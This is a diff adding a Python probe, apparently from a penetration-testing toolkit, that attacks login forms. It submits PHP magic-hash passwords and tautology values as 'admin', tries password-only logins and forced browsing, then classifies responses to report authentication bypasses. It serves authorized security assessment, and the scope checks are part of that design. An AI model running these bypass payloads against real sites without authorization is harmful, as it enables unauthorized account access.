@@ -1,0 +1,374 @@
+#!/usr/bin/env python3
+"""Authentication bypass probe — tests login forms for logic-layer bypass techniques.
+
+Covers attack classes that sqli_detect and weak_cred_probe do NOT:
+  * PHP type juggling / magic hashes (loose == with 0e prefix)
+  * Empty / null / array parameter bypass
+  * Always-true / tautology password values
+  * Forced browsing to auth-gated endpoints without a session
+
+Flow:
+  1. GET the login page — parse the form (action, fields).
+  2. For each bypass payload: POST to the form action with the payload.
+  3. Classify success vs failure (status, redirect, body diff, markers).
+  4. If successful → confirmed auth_bypass finding.
+
+Usage:
+  vapt-auth-bypass-probe --target <host> --url <login-page-url>
+    [--password-field password] [--username-field username]
+    [--extra-fields k=v,k2=v2]
+    [--authed-endpoints url1,url2,...]
+
+Output: ONE JSON record to stdout:
+    {"findings": [...], "trace": [...]}
+"""
+from __future__ import annotations
+
+import argparse
+import json
+import os
+import re
+import sys
+import time
+from urllib.parse import urlparse, urljoin
+
+try:
+    import requests
+except Exception as e:
+    print(json.dumps({"error": f"requests not available: {e}", "findings": []}))
+    sys.exit(0)
+
+_UA = "vapt-auth-bypass-probe/1.0 (authorized assessment)"
+_REQ_TIMEOUT = 10
+_TOTAL_BUDGET_S = 120
+
+# PHP magic hash payloads: passwords whose MD5 starts with 0e[0-9]+,
+# so PHP's loose == treats them as 0 (scientific notation).
+_MAGIC_HASH_MD5: tuple[str, ...] = (
+    "240610708",    # 0e462097431906509019562988736854
+    "QNKCDZO",     # 0e830400451993494058024219903391
+    "aabg7XSs",    # 0e087386482136013740957780965295
+    "aabC9RqS",    # 0e041022518165728065344349536099
+    "0e215962017",  # 0e291242476940776845150308577824
+    "byGcY",       # 0e591948146966052067035298880982
+)
+
+# Tautology / logic bypass payloads (NOT SQL injection — sqli_detect handles that).
+_TAUTOLOGY_PASSWORDS: tuple[str, ...] = (
+    "true",
+    "1",
+    "[]",
+    "0",
+)
+
+# Body fragments strongly suggesting login failure.
+_FAILURE_MARKERS = (
+    "invalid", "incorrect", "wrong", "try again", "login failed",
+    "authentication failed", "bad username", "bad password",
+    "not valid", "please log in", "please login", "sign in",
+    "access denied", "forbidden", "unauthorized",
+)
+
+_SUCCESS_MARKERS = (
+    "welcome", "dashboard", "logged in", "log out", "logout",
+    "my account", "profile", "admin panel", "settings",
+    "congratulations", "flag{", "flag:",
+)
+
+_INPUT_RE = re.compile(
+    r"""<input\b[^>]*?\bname\s*=\s*["']([^"']+)["'][^>]*?\btype\s*=\s*["']([^"']+)["']"""
+    r"""|<input\b[^>]*?\btype\s*=\s*["']([^"']+)["'][^>]*?\bname\s*=\s*["']([^"']+)["']""",
+    re.IGNORECASE,
+)
+
+_FORM_RE = re.compile(
+    r'<form\b[^>]*?\baction\s*=\s*["\']([^"\']*)["\']', re.IGNORECASE
+)
+
+
+def _in_scope(target_host: str, url: str) -> bool:
+    try:
+        return urlparse(url).hostname == target_host
+    except Exception:
+        return False
+
+
+def _parse_extras(s: str) -> dict:
+    out: dict[str, str] = {}
+    if not s:
+        return out
+    for pair in s.split(","):
+        if "=" in pair:
+            k, v = pair.split("=", 1)
+            out[k.strip()] = v.strip()
+    return out
+
+
+def _classify(resp, baseline_len: int, baseline_markers: set) -> tuple[bool, str]:
+    """Classify a login response as success or failure."""
+    body = (resp.text or "").lower()
+    body_len = len(body)
+
+    for m in _SUCCESS_MARKERS:
+        if m in body and m not in baseline_markers:
+            return True, f"success marker '{m}' appeared"
+
+    for m in _FAILURE_MARKERS:
+        if m in body:
+            return False, f"failure marker '{m}'"
+
+    loc = resp.headers.get("location", "").lower()
+    if resp.status_code in (301, 302, 303):
+        if any(w in loc for w in ("login", "signin", "sign-in", "auth")):
+            return False, "redirected back to login"
+        if any(w in loc for w in ("dashboard", "admin", "home", "welcome", "index")):
+            return True, f"redirected to {loc}"
+
+    if resp.status_code == 200 and baseline_len > 0:
+        ratio = body_len / baseline_len if baseline_len else 0
+        if ratio > 1.3:
+            return True, f"body size increased significantly ({baseline_len}→{body_len})"
+
+    return False, "no bypass indicator"
+
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--target", required=True)
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--password-field", default="")
+    ap.add_argument("--username-field", default="")
+    ap.add_argument("--extra-fields", default="")
+    ap.add_argument("--authed-endpoints", default="")
+    args = ap.parse_args()
+
+    target = args.target
+    url = args.url
+    if not _in_scope(target, url):
+        print(json.dumps({"error": "url not in scope", "findings": []}))
+        return
+
+    findings: list[dict] = []
+    trace: list[dict] = []
+    deadline = time.time() + _TOTAL_BUDGET_S
+    sess = requests.Session()
+    sess.headers["User-Agent"] = _UA
+    sess.verify = False
+
+    # Suppress urllib3 InsecureRequestWarning
+    try:
+        import urllib3
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    except Exception:
+        pass
+
+    # Phase 1: GET login page, parse form
+    try:
+        r0 = sess.get(url, timeout=_REQ_TIMEOUT, allow_redirects=True)
+    except Exception as e:
+        print(json.dumps({"error": f"GET {url}: {e}", "findings": []}))
+        return
+
+    html = r0.text or ""
+    baseline_len = len(html.lower())
+
+    # Collect baseline markers present in the login form
+    baseline_markers: set[str] = set()
+    html_lower = html.lower()
+    for m in _SUCCESS_MARKERS:
+        if m in html_lower:
+            baseline_markers.add(m)
+
+    # Detect form fields
+    user_field = args.username_field
+    pass_field = args.password_field
+    form_action = url
+
+    if not user_field or not pass_field:
+        for m in _INPUT_RE.finditer(html):
+            name = m.group(1) or m.group(4) or ""
+            itype = (m.group(2) or m.group(3) or "").lower()
+            if itype == "password" and not pass_field:
+                pass_field = name
+            elif itype in ("text", "email") and not user_field:
+                user_field = name
+        if not pass_field:
+            pass_field = "password"
+
+    fm = _FORM_RE.search(html)
+    if fm:
+        raw_action = fm.group(1)
+        if raw_action:
+            form_action = urljoin(url, raw_action)
+
+    if not _in_scope(target, form_action):
+        form_action = url
+
+    extras = _parse_extras(args.extra_fields)
+
+    # Phase 2: Test bypass payloads
+    # 2a) PHP magic hash payloads
+    for pwd in _MAGIC_HASH_MD5:
+        if time.time() > deadline:
+            break
+        data = dict(extras)
+        if user_field:
+            data[user_field] = "admin"
+        data[pass_field] = pwd
+
+        try:
+            s = requests.Session()
+            s.headers["User-Agent"] = _UA
+            s.verify = False
+            r = s.post(form_action, data=data, timeout=_REQ_TIMEOUT,
+                       allow_redirects=False)
+            # Follow one redirect if present
+            if r.status_code in (301, 302, 303) and r.headers.get("location"):
+                loc = urljoin(form_action, r.headers["location"])
+                if _in_scope(target, loc):
+                    r = s.get(loc, timeout=_REQ_TIMEOUT, allow_redirects=False)
+
+            success, note = _classify(r, baseline_len, baseline_markers)
+            trace.append({
+                "technique": "php_magic_hash", "password": pwd,
+                "status": r.status_code, "len": len(r.text or ""),
+                "success": success, "note": note,
+            })
+            if success:
+                findings.append({
+                    "type": "auth_bypass",
+                    "subtype": "php_type_juggling",
+                    "severity": "critical",
+                    "url": form_action,
+                    "evidence": f"PHP magic hash '{pwd}' bypassed authentication "
+                                f"(loose == comparison with md5). {note}",
+                    "confirmed": True,
+                })
+                break
+        except Exception as e:
+            trace.append({"technique": "php_magic_hash", "password": pwd,
+                          "error": str(e)[:200]})
+
+    # 2b) Tautology / empty / type confusion payloads
+    for pwd in _TAUTOLOGY_PASSWORDS:
+        if time.time() > deadline:
+            break
+        data = dict(extras)
+        if user_field:
+            data[user_field] = "admin"
+        data[pass_field] = pwd
+
+        try:
+            s = requests.Session()
+            s.headers["User-Agent"] = _UA
+            s.verify = False
+            r = s.post(form_action, data=data, timeout=_REQ_TIMEOUT,
+                       allow_redirects=False)
+            if r.status_code in (301, 302, 303) and r.headers.get("location"):
+                loc = urljoin(form_action, r.headers["location"])
+                if _in_scope(target, loc):
+                    r = s.get(loc, timeout=_REQ_TIMEOUT, allow_redirects=False)
+
+            success, note = _classify(r, baseline_len, baseline_markers)
+            trace.append({
+                "technique": "tautology", "password": pwd,
+                "status": r.status_code, "len": len(r.text or ""),
+                "success": success, "note": note,
+            })
+            if success:
+                findings.append({
+                    "type": "auth_bypass",
+                    "subtype": "tautology_bypass",
+                    "severity": "critical",
+                    "url": form_action,
+                    "evidence": f"Tautology value '{pwd}' bypassed authentication. {note}",
+                    "confirmed": True,
+                })
+                break
+        except Exception as e:
+            trace.append({"technique": "tautology", "password": pwd,
+                          "error": str(e)[:200]})
+
+    # 2c) Password-only form: test without username
+    if user_field:
+        for pwd in _MAGIC_HASH_MD5[:3]:
+            if time.time() > deadline:
+                break
+            data = dict(extras)
+            data[pass_field] = pwd
+
+            try:
+                s = requests.Session()
+                s.headers["User-Agent"] = _UA
+                s.verify = False
+                r = s.post(form_action, data=data, timeout=_REQ_TIMEOUT,
+                           allow_redirects=False)
+                if r.status_code in (301, 302, 303) and r.headers.get("location"):
+                    loc = urljoin(form_action, r.headers["location"])
+                    if _in_scope(target, loc):
+                        r = s.get(loc, timeout=_REQ_TIMEOUT, allow_redirects=False)
+
+                success, note = _classify(r, baseline_len, baseline_markers)
+                trace.append({
+                    "technique": "password_only_magic_hash", "password": pwd,
+                    "status": r.status_code, "len": len(r.text or ""),
+                    "success": success, "note": note,
+                })
+                if success:
+                    findings.append({
+                        "type": "auth_bypass",
+                        "subtype": "php_type_juggling",
+                        "severity": "critical",
+                        "url": form_action,
+                        "evidence": f"PHP magic hash '{pwd}' bypassed password-only "
+                                    f"authentication (no username submitted). {note}",
+                        "confirmed": True,
+                    })
+                    break
+            except Exception as e:
+                trace.append({"technique": "password_only_magic_hash",
+                              "password": pwd, "error": str(e)[:200]})
+
+    # Phase 3: Forced browsing — test authed endpoints without cookie
+    authed_eps = [u.strip() for u in (args.authed_endpoints or "").split(",")
+                  if u.strip()]
+    for ep in authed_eps[:5]:
+        if time.time() > deadline:
+            break
+        if not _in_scope(target, ep):
+            continue
+        try:
+            s = requests.Session()
+            s.headers["User-Agent"] = _UA
+            s.verify = False
+            r = s.get(ep, timeout=_REQ_TIMEOUT, allow_redirects=False)
+            body = (r.text or "").lower()
+            is_accessible = (
+                r.status_code == 200
+                and not any(m in body for m in ("login", "sign in", "unauthorized"))
+                and len(body) > 200
+            )
+            trace.append({
+                "technique": "forced_browsing", "url": ep,
+                "status": r.status_code, "len": len(body),
+                "accessible": is_accessible,
+            })
+            if is_accessible:
+                findings.append({
+                    "type": "auth_bypass",
+                    "subtype": "broken_access_control",
+                    "severity": "high",
+                    "url": ep,
+                    "evidence": f"Endpoint accessible without authentication "
+                                f"(status={r.status_code}, {len(body)} bytes)",
+                    "confirmed": True,
+                })
+        except Exception as e:
+            trace.append({"technique": "forced_browsing", "url": ep,
+                          "error": str(e)[:200]})
+
+    print(json.dumps({"findings": findings, "trace": trace}))
+
+
+if __name__ == "__main__":
+    main()
